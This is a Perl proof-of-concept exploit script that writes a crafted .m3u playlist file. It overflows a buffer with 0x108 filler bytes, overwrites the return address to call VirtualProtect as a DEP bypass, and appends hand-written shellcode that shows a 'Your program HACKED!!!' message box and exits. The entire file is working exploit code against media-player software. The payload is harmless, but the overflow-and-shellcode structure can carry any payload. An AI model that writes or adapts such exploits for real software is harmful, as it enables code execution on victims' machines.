my $file = "ROPMsgBox32.m3u";
my $junk = "\x41" x 0x108;
my $eip  = "\xD0\xA3\x7C\x75";	#VirtualProtect(0x757CA3D0)
my $retAddr	= "XXXX";
my $pram1	= "YYYY";
my $pram2	= "ZZZZ";
my $pram3	= "\x40\x00\x00\x00";
my $pram4	= "\xF0\x81\x41\x00";	#0x004181F0
my $shellcode = "\x90" x 4; # 0x90 = NOP
$shellcode = $shellcode.
"\x6A\x10".
"\x6A\x00".
"\x8D\x44\x24\x28".	# 0x28
"\x50".
"\x6A\x00".
"\xFF\x15\x84\x91\x41\x00".	#MessageBoxA(0x00419184)
"\x6A\x01".
"\xFF\x15\x0C\x91\x41\x00";	#exit(0x0041910C)
my $junk2 = "\x90" x 3;
my $mesg = "Your program HACKED!!!\x00\x00";
open($FILE, ">$file");
print $FILE $junk.$eip.$retAddr.$pram1.$pram2.$pram3.$pram4.$shellcode.$junk2.$mesg;
close($FILE);
print "m3u File Created Successfully \n";



